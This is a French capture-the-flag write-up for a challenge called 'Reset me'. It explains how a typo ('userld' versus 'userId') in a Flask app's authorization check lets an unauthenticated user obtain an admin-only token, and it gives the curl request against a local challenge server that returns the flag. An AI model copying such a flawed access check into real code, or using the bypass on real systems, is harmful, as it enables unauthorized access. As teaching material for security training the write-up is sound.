# Writeup 🌶️ Reset me

_Disclaimer : ce challenge est basé sur une histoire vraie qui m'est arrivée dans une expérience professionnelle précédente._

Du code python complexe pour pas grand chose où le développeur semble avoir utilisé des moufles pour écrire son code.

Le but est de réussir à générer un "super token" que seul un admin serait autorisé à le faire.

## Analyse du code

Dans cette application flask, la route `/token` permet de générer un token :
- si on est non authentifié, la méthode nous retourne une valeur aléatoire
- sinon, elle nous retourne un jeton qui contient le flag.

Pour obtenir le "super token", il faut que la requête contienne :
- soit le paramètre GET ou POST `userId`
- soit le cookie `userId`
- soit l'entête `X-USERID`

La méthode `legit_request` autorise le mot `userId` dans l'ensemble de la requête uniquement si celle-ci contient un entête `X-ADMIN-TOKEN` valable ou si la requête vient d'une IP autorisée. Nous n'avons ni l'un ni l'autre, donc cela semble impossible...

Sauf si on regarde plus précisemment ces deux lignes :

```python
    if request.args.get('userId') is not None or request.form.get('userld') is not None:
        user = request.form.get('userId') if request.form.get('userId') else request.args.get('userld')
```

En regardant attentivement, on remarque qu'il y a une erreur de typo. (`userId` vs `userld`).
On peut simplifier le code précédent (et sans utiliser `userId`) comme ceci:

```python
    if request.form.get('userld') is not None: # paramètre POST userld
        user = request.args.get('userld') # paramètre GET userld
```

## Exploitation

Maintenant qu'on sait que la variable `user` peut être affectée sans être authentifié, ni être whitelisté et ni utiliser le mot `userId`, la commande suivante permet de récupérer le flag :

```console
pun@ctf:~$ curl -X POST 'http://localhost:45001/token?userld=foo' -d 'userld=foo'
foo#brb{Dyslexai_c4n_b3_a_PaiN_f0r_S3cur1ty}
```
